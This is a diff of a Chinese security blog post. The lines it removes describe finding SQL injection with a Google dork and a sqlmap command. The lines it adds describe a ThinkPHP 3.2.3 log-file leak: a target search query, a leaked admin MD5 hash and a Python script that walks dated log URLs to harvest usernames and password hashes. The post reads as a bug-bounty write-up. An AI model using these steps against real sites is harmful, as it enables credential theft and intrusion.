@@ -16,30 +16,30 @@
   <meta name="author" content="3xsh0re">
   <meta name="keywords" content="">
   
-    <meta name="description" content="幸运儿之登陆框发现SQL注入哈哈🤣😂">
+    <meta name="description" content="想起来自己还有一个博客，更新一下最近的SRC挖掘经历。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="一次公益src挖掘-230820">
-<meta property="og:url" content="https://3xsh0re.github.io/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/index.html">
+<meta property="og:title" content="SRC之ThinkPHP信息泄露">
+<meta property="og:url" content="https://3xsh0re.github.io/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/index.html">
 <meta property="og:site_name" content="3xsh0re&#39;Blog">
-<meta property="og:description" content="幸运儿之登陆框发现SQL注入哈哈🤣😂">
+<meta property="og:description" content="想起来自己还有一个博客，更新一下最近的SRC挖掘经历。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-16-54.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-22-15.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-18-37.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-23-17.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-25-55.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-31_23-04-41.png">
-<meta property="article:published_time" content="2023-08-20T10:14:40.000Z">
-<meta property="article:modified_time" content="2024-07-08T06:57:16.561Z">
+<meta property="og:image" content="https://3xsh0re.github.io/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Snipaste_2023-08-10_23-08-06.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Snipaste_2023-08-10_23-09-15.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Snipaste_2023-08-10_23-12-07.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Snipaste_2023-08-10_23-14-53.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Snipaste_2023-08-10_23-16-59.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Snipaste_2023-08-31_23-06-49.png">
+<meta property="article:published_time" content="2023-08-04T14:54:55.000Z">
+<meta property="article:modified_time" content="2024-07-11T03:27:48.387Z">
 <meta property="article:author" content="3xsh0re">
 <meta property="article:tag" content="SRC">
-<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="Thinkphp">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://3xsh0re.github.io/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-16-54.png">
+<meta name="twitter:image" content="https://3xsh0re.github.io/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Snipaste_2023-08-10_23-08-06.png">
   
   
   
-  <title>一次公益src挖掘-230820 - 3xsh0re&#39;Blog</title>
+  <title>SRC之ThinkPHP信息泄露 - 3xsh0re&#39;Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -346,7 +346,7 @@ mjx-container[display="true"] + br {
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="一次公益src挖掘-230820"></span>
+            <span id="subtitle" data-typed-text="SRC之ThinkPHP信息泄露"></span>
           
         </div>
 
@@ -357,8 +357,8 @@ mjx-container[display="true"] + br {
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-08-20 18:14" pubdate>
-          2023年8月20日 晚上
+        <time datetime="2023-08-04 22:54" pubdate>
+          2023年8月4日 晚上
         </time>
       </span>
     
@@ -369,7 +369,7 @@ mjx-container[display="true"] + br {
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          285 字
+          964 字
         
       </span>
     
@@ -380,7 +380,7 @@ mjx-container[display="true"] + br {
         
         
         
-          3 分钟
+          9 分钟
         
       </span>
     
@@ -425,12 +425,12 @@ mjx-container[display="true"] + br {
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">一次公益src挖掘-230820</h1>
+            <h1 id="seo-header">SRC之ThinkPHP信息泄露</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2024年7月8日 下午
+                    本文最后更新于：2024年7月11日 上午
                   
                 
               </p>
@@ -438,29 +438,37 @@ mjx-container[display="true"] + br {
             
               <div class="markdown-body">
                 
-                <p>幸运儿之登陆框发现SQL注入哈哈🤣😂</p>
+                <p>想起来自己还有一个博客，更新一下最近的SRC挖掘经历。</p>
 <span id="more"></span>
 
-<h3 id="Google语法找目标"><a href="#Google语法找目标" class="headerlink" title="Google语法找目标"></a>Google语法找目标</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">intext:后台登录  inurl:login.php -canvas -十合一全网营销方案<br></code></pre></td></tr></table></figure>
+<p>一个TinkPHP的信息泄露，这个洞很简单，但是我挖的第一个洞，故记录。</p>
+<h3 id="鹰图找目标"><a href="#鹰图找目标" class="headerlink" title="鹰图找目标"></a>鹰图找目标</h3><p><a target="_blank" rel="noopener" href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p>
+<p>搜索语法，找到PHP的站点</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">icp.name<span class="hljs-operator">=</span><span class="hljs-string">"xxx市"</span> and app.vendor<span class="hljs-operator">=</span><span class="hljs-string">"PHP"</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="发现登录页面"><a href="#发现登录页面" class="headerlink" title="发现登录页面"></a>发现登录页面</h3><img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-16-54.png" srcset="/img/loading.gif" lazyload class="">
+<h3 id="发现存在Thinkphp框架"><a href="#发现存在Thinkphp框架" class="headerlink" title="发现存在Thinkphp框架"></a>发现存在Thinkphp框架</h3><p>访问网站，出现登陆页</p>
+<img src="/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Snipaste_2023-08-10_23-08-06.png" srcset="/img/loading.gif" lazyload class="">
 
-<p>抓包，</p>
-<img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-22-15.png" srcset="/img/loading.gif" lazyload class="">
+<p>发现采用ThinkPHP框架</p>
+<img src="/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Snipaste_2023-08-10_23-09-15.png" srcset="/img/loading.gif" lazyload class="">
 
-<p>首先测试弱口令爆破，</p>
-<img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-18-37.png" srcset="/img/loading.gif" lazyload class="">
+<p>使用工具扫描直接出ThinkPHP3.2.3日志泄露</p>
+<img src="/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Snipaste_2023-08-10_23-12-07.png" srcset="/img/loading.gif" lazyload class="">
 
-<p>没有🤣</p>
-<h3 id="发现存在SQL注入"><a href="#发现存在SQL注入" class="headerlink" title="发现存在SQL注入"></a>发现存在SQL注入</h3><p>传统艺能之跑<code>sqlmap</code>，保存请求包到txt文件，使用命令：<code>python sqlmap.py -r "./test.txt" --threads=10 --tamper=between --time-sec=2 --dbms=mysql --union-char=a --dbs</code>，欸嘿，还真跑出来了😎</p>
-<img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-23-17.png" srcset="/img/loading.gif" lazyload class="">
+<p>访问url：<a target="_blank" rel="noopener" href="http://xxx.xxx.com/App/Runtime/Logs/Home/23_08_04.log">http://xxx.xxx.com/App/Runtime/Logs/Home/23_08_04.log</a></p>
+<p>确认存在日志信息泄露，且发现存在用户名和密码的hash值泄露</p>
+<img src="/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Snipaste_2023-08-10_23-14-53.png" srcset="/img/loading.gif" lazyload class="">
 
-<p>跑个数据名和表名作为证据：</p>
-<img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-25-55.png" srcset="/img/loading.gif" lazyload class="">
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `yz_users` <span class="hljs-keyword">WHERE</span> `username` <span class="hljs-operator">=</span> <span class="hljs-string">'admin'</span> <span class="hljs-keyword">AND</span> `password` <span class="hljs-operator">=</span> <span class="hljs-string">'591d1260284e15731d151787dd6ad356'</span> LIMIT <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
-<p>点到为止就可以提交到平台</p>
-<p>一个妥妥的高危😊😊</p>
-<img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-31_23-04-41.png" srcset="/img/loading.gif" lazyload class="">
+<h3 id="写Python脚本遍历收集"><a href="#写Python脚本遍历收集" class="headerlink" title="写Python脚本遍历收集"></a>写Python脚本遍历收集</h3><p>选择写一个Python脚本收集所有用户名和密码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>,<span class="hljs-number">24</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>            url=<span class="hljs-string">f'http://xxx.xxx.com/App/Runtime/Logs/Home/<span class="hljs-subst">{i}</span>_0<span class="hljs-subst">{j}</span>_0<span class="hljs-subst">{k}</span>.log'</span><br>            response = requests.get(url)<br>            <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>                data = response.text<br>                pattern = <span class="hljs-string">r"`username`\s*=\s*([^`]+)\s+AND\s+`password`\s*=\s*([^`]+)"</span><br>                username_match = re.search(pattern, data)<br>                <span class="hljs-keyword">if</span> username_match:<br>                    <span class="hljs-comment"># 提取到了username和password</span><br>                    username = username_match.group(<span class="hljs-number">1</span>)<br>                    password = username_match.group(<span class="hljs-number">2</span>)<br>                    password = password[<span class="hljs-number">0</span>:<span class="hljs-number">34</span>]<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Match:<span class="hljs-subst">{username}</span>:<span class="hljs-subst">{password}</span>"</span>)<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Snipaste_2023-08-10_23-16-59.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>居然只给了一个中危，可能有MD5吧哈哈🤣🤣</p>
+<img src="/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Snipaste_2023-08-31_23-06-49.png" srcset="/img/loading.gif" lazyload class="">
+
 
                 
               </div>
@@ -496,7 +504,7 @@ mjx-container[display="true"] + br {
       
         <a href="/tags/SRC/" class="print-no-link">#SRC</a>
       
-        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" class="print-no-link">#SQL注入</a>
+        <a href="/tags/Thinkphp/" class="print-no-link">#Thinkphp</a>
       
     </div>
   
@@ -508,8 +516,8 @@ mjx-container[display="true"] + br {
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>一次公益src挖掘-230820</div>
-      <div>https://3xsh0re.github.io/2023/08/20/一次公益src挖掘-230820/</div>
+      <div>SRC之ThinkPHP信息泄露</div>
+      <div>https://3xsh0re.github.io/2023/08/04/SRC之ThinkPHP信息泄露/</div>
     </div>
     <div class="license-meta">
       
@@ -521,7 +529,7 @@ mjx-container[display="true"] + br {
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年8月20日</div>
+          <div>2023年8月4日</div>
         </div>
       
       
@@ -553,9 +561,9 @@ mjx-container[display="true"] + br {
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/" title="一次路由器Getshell-230829">
+                      <a href="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/" title="一次公益src挖掘-230804">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">一次路由器Getshell-230829</span>
+                        <span class="hidden-mobile">一次公益src挖掘-230804</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -563,8 +571,8 @@ mjx-container[display="true"] + br {
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/" title="GO学习笔记_1">
-                        <span class="hidden-mobile">GO学习笔记_1</span>
+                      <a href="/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/" title="Hexo个人博客写文章以及Git报错解决">
+                        <span class="hidden-mobile">Hexo个人博客写文章以及Git报错解决</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
